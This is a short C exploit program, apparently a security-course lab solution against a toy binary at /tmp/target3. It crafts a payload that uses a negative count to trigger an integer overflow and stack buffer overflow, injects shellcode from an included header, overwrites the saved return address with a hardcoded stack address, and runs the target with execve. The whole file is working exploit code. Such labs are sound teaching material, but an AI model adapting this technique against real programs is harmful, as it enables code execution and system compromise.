#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  /* Allocate payload and remove zeros */
  char payload[20035];
  memset (payload, 1, sizeof payload);
  /* Give a negative widget count. Note that this val times
     20 (ie, sizeof widget) is 20016, so memcpy will overrun
     the buffer with 20000 bytes. */
  strcpy (payload, "-214747364");
  payload[10] = ',';
  /* Copy in shellcode without terminating zero. */
  memcpy (payload + 11, shellcode, strlen(shellcode));
  /* The saved eip is 12 beyond the buffer, so we put the
     buffer's address at 23 beyond to account for 11 removed
     characters (due to count). */
  *(int*)(payload + 20023) = 0xbfff61d0;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
